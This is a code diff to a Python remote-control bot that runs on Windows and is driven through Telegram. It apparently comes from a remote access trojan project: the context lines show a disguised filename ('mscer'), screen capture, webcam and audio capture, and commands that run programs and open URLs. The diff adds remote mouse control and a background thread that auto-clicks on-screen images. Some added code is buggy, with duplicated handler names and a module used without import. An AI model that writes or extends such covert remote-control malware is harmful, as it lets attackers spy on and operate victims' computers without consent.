@@ -2,6 +2,8 @@
 
 import os
 import sys
+import threading
+
 import cv2
 import wave
 import time
@@ -29,6 +31,7 @@ from win32gui import GetWindowText, GetForegroundWindow
 from ctypes import cast, POINTER
 from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
+from pyautogui import leftClick, center, locateOnScreen
 
 fname = 'mscer' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
 
@@ -135,12 +138,29 @@ button2 = types.KeyboardButton('/Screen\n🖼')
 button3 = types.KeyboardButton('/6\n>>')
 button4 = types.KeyboardButton('/Message\n💬')
 button5 = types.KeyboardButton('/Voice\n📢')
-button6 = types.KeyboardButton('/OpenURL\n🌐')
-button7 = types.KeyboardButton('/Wallpapers\n🧩')
-button8 = types.KeyboardButton('/OpenEXE\n⏱')
+button6 = types.KeyboardButton('/Mouse\n📢')
+button7 = types.KeyboardButton('/OpenURL\n🌐')
+button8 = types.KeyboardButton('/Wallpapers\n🧩')
+button9 = types.KeyboardButton('/OpenEXE\n⏱')
 main8.row(button1, button2, button3)
-main8.row(button4, button5)
-main8.row(button6, button7, button8)
+main8.row(button4, button5, button6)
+main8.row(button7, button8, button9)
+
+main15 = types.ReplyKeyboardMarkup()
+button1 = types.KeyboardButton('/LeftClick')
+button2 = types.KeyboardButton('/Screen\n🖼')
+button3 = types.KeyboardButton('/RightClick')
+button4 = types.KeyboardButton('/LeftDoubleClick')
+button5 = types.KeyboardButton('/MiddleClick')
+button6 = types.KeyboardButton('/RightHold')
+button7 = types.KeyboardButton('/AutoAcceptOn')
+button8 = types.KeyboardButton('/MoveMouse')
+button9 = types.KeyboardButton('/AutoAcceptOff')
+button10 = types.KeyboardButton('/Cancel3')
+main15.row(button1, button2, button3)
+main15.row(button4, button5, button6)
+main15.row(button7, button8, button9)
+main15.row(button10)
 
 main9 = types.InlineKeyboardMarkup()
 button1 = types.InlineKeyboardButton('Открыть один раз - 🧨', callback_data='startfile')
@@ -1378,6 +1398,12 @@ def cancelfiles(command):
         bot.send_chat_action(command.chat.id, 'typing')
         bot.send_message(command.chat.id, '`...`', reply_markup=main6, parse_mode="Markdown")
 
+@bot.message_handler(commands=['Cancel3', 'cancel3'])
+def cancelfiles(command):
+    if command.chat.id in adm:
+        bot.send_chat_action(command.chat.id, 'typing')
+        bot.send_message(command.chat.id, '`...`', reply_markup=main8, parse_mode="Markdown")
+
 @bot.message_handler(commands=['Tasklist', 'tasklist'])
 def tasklist(command):
     if command.chat.id in adm:
@@ -1508,6 +1534,111 @@ def say(message):
             bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
         except:
             pass
+
+
+@bot.message_handler(commands=['Mouse', 'mouse'])
+def mouse(message):
+    if message.chat.id in adm:
+        try:
+            bot.send_message(message.chat.id, '. . .', parse_mode="Markdown", reply_markup=main15)
+        except:
+            pass
+
+
+@bot.message_handler(commands=['LeftClick', 'leftclick', 'click', 'Click', 'lc'])
+def leftclick(message):
+    if message.chat.id in adm:
+        try:
+            pyautogui.leftClick()
+            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
+        except:
+            pass
+
+
+@bot.message_handler(commands=['RightClick', 'rightclick', 'rc'])
+def rightclick(message):
+    if message.chat.id in adm:
+        try:
+            pyautogui.rightClick()
+            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
+        except:
+            pass
+
+
+@bot.message_handler(commands=['LeftDoubleClick', 'leftdoubleclick', 'ldc'])
+def leftdoubleclick(message):
+    if message.chat.id in adm:
+        try:
+            pyautogui.doubleClick(button="left")
+            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
+        except:
+            pass
+
+
+@bot.message_handler(commands=['MiddleClick', 'middleclick', 'mc'])
+def middleclick(message):
+    if message.chat.id in adm:
+        try:
+            pyautogui.middleClick()
+            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
+        except:
+            pass
+
+
+@bot.message_handler(commands=['RightHold', 'righthold', 'rh'])
+def righthold(message):
+    if message.chat.id in adm:
+        try:
+            pyautogui.mouseDown(button="right")
+            time.sleep(2)
+            pyautogui.mouseUp(button="right")
+            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
+        except:
+            pass
+
+
+@bot.message_handler(commands=['AutoAcceptOn', 'autoaccepton', 'acon'])
+def autoaccepton(message):
+    global stopfunc
+    if message.chat.id in adm:
+        try:
+            stopfunc = 0
+            def func(id):
+                global stopfunc
+                while stopfunc == 0:
+                    for i in os.listdir("c:/ProgramData/Files/Photos/ScreenAccept"):
+                        try:
+                            leftClick(center(locateOnScreen("c:/ProgramData/Files/Photos/ScreenAccept/"+i, confidence=0.9)))
+                            bot.send_message(id, "Успешно принята игра")
+                            stopfunc = 0
+                            break
+                        except:
+                            time.sleep(0.05)
+            threading.Thread(target=func, args=(message.chat.id,)).start()
+            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
+        except:
+            pass
+
+
+@bot.message_handler(commands=['AutoAcceptOff', 'autoacceptoff', 'acoff'])
+def autoaccepton(message):
+    global stopfunc
+    if message.chat.id in adm:
+        try:
+            stopfunc = 1
+            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
+        except:
+            pass
+
+
+@bot.message_handler(commands=['MoveMouse', 'movemouse', 'mm'])
+def autoaccepton(message):
+    if message.chat.id in adm:
+        try:
+            pyautogui.moveTo(x=int(message.text.split()[1]), y=int(message.text.split()[2]))
+            bot.send_message(message.chat.id, '*Готово!*', parse_mode="Markdown")
+        except Exception as e:
+            print(e)
 
 try:
     bot.polling(none_stop=True)
